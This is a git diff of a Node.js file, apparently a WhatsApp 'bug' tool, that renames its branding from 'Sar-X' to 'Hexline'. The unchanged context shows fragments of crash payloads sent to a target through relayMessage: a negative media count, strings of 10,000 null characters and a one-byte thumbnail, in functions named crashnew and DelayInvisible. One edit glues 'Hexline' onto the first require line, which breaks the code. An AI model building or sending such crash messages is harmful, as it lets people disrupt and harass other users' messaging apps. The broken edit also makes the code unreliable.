@@ -1,4 +1,4 @@
-const express = require("express");
+Hexlineconst express = require("express");
 const fs = require("fs");
 const crypto = require("crypto");
 const app = express();
@@ -57,7 +57,7 @@ async function crashnew(target) {
   }
   await pnx.relayMessage(target, {
     albumMessage: {
-      caption: " ─ 𝗦𝗮𝗿-𝗫. ",
+      caption: " ─ Hexline. ",
       mediaCount: -99999999,
       firstMedia: {},
       contextInfo: payload.contextInfo
@@ -80,7 +80,7 @@ async function crashnew(target) {
         locale: "",
         fallbackLg: "",
         fallbackLc: "",
-        title: "𝗦𝗮𝗿-𝗫",
+        title: "Hexline",
         description: "\u0000".repeat(10000),
         buttonText: "\u0000".repeat(10000),
       },
@@ -91,7 +91,7 @@ async function crashnew(target) {
     viewOnceMessage: {
       message: {
         imageMessage: {
-          caption: " ─ 𝗦𝗮𝗿-𝗫. ",
+          caption: " ─ Hexline. ",
           jpegThumbnail: Buffer.alloc(1),
           contextInfo: payload.contextInfo
         }
@@ -124,12 +124,12 @@ async function DelayInvisible(target, sock) {
                     message: {
                         interactiveMessage: {
                             header: {
-                                title: "𝗦𝗮𝗿-𝗫?",
+                                title: "Hexline?",
                                 subtitle: "",
                                 hasMediaAttachment: false,
                             },
                             body: {
-                                text: "𝗦𝗮𝗿-𝗫 bag bug"
+                                text: "Hexline bag bug"
                             },
                             nativeFlowMessage: {
                                 buttons,
@@ -149,7 +149,7 @@ async function DelayInvisible(target, sock) {
             await new Promise((resolve) => setTimeout(resolve, 200));
         }
 
-        console.log("success bug by 𝗦𝗮𝗿-𝗫👋");
+        console.log("success bug by Hexline👋");
 
     } catch (err) {
         console.error("Error:", err);
@@ -184,7 +184,7 @@ async function betadelayNew(xrelly, x, z) {
             message: {
                 interactiveResponseMessage: {
                     body: {
-                        text: "𝗦𝗮𝗿-𝗫 Is Coming!!!",
+                        text: "Hexline Is Coming!!!",
                         format: "DEFAULT"
                     },
                     nativeFlowResponseMessage: {
